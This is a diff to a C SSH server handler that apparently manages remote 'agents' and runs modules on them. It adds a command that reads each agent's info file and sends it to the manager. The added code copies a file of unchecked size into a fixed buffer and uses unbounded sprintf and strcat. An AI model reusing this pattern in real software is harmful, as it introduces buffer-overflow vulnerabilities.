@@ -211,10 +211,14 @@ void manager_handler(struct clientNode *node){
     int size_e = 0;
     char *ptr = NULL;
     char *dat_ptr = NULL;
-    char buff[2048];
+    char buff[BUFSIZ];
     char tmpbuffer[8];
     char filename[2048];
+    char name[BUFSIZ];
     FILE *file;
+    DIR *dir;
+    struct dirent *ent;
+            
 
     while (!quitting)
     {
@@ -225,9 +229,11 @@ void manager_handler(struct clientNode *node){
         size_e = 0;
         file = NULL;
         dat_ptr = NULL;
-        memset(buff, 0, 2048);
-        memset(tmpbuffer, 0, 8);
-        memset(filename, 0, 2048);
+
+        
+        memset(buff, 0, sizeof(buff));
+        memset(tmpbuffer, 0, sizeof(tmpbuffer));
+        memset(filename, 0, sizeof(filename));
         
         rc = ssh_channel_read(manager->chan, resp, sizeof(resp), 0);
         if (rc == SSH_ERROR)
@@ -367,6 +373,45 @@ void manager_handler(struct clientNode *node){
 
             printf("Manager %s: Execution of module ended with exit code %s\n", manager->id, tmpbuffer);
 
+            break;
+
+        case MANAG_GET_INFO:
+            size = 0;
+            if ((dir = opendir ("agents/")) != NULL) {
+                /* print all the files and directories within directory */
+                while ((ent = readdir (dir)) != NULL) {
+                    if(!strcmp(ent->d_name, ".") || !strcmp(ent->d_name, "..") || !strcmp(ent->d_name, "agents.dat")){
+                        continue;
+                    } else {
+                        memset(buff, 0, sizeof(buff));
+                        memset(name, 0, sizeof(name));
+                        sprintf(buff, "/agents/%s/info.txt", ent->d_name);
+                        getcwd(name, sizeof(name));
+                        strcat(name, buff);
+                        file = fopen(name, "r");
+                        memset(buff, 0, sizeof(buff));
+                        if(file == NULL){
+                            printf("Manager %s: Could not get info on agent %s\n", manager->id, ent->d_name);
+                            perror("");
+                        } else {
+                            printf("File opened successfully\n");
+                            fseek(file, 0L, SEEK_END);
+                            size = ftell(file);
+                            printf("Size: %d\n", size);
+                            rewind(file);
+                            fread(buff, 1, size, file);
+                            ssh_channel_write(manager->chan, buff, sizeof(buff));
+                            ssh_channel_read(manager->chan, tmpbf, 3, 0);
+                        }
+                    }
+                }
+                ssh_channel_write(manager->chan, "fi", 2);
+                closedir (dir);
+            } else {
+                /* could not open directory */
+                perror ("");
+                return;
+            }
             break;
 
         default:
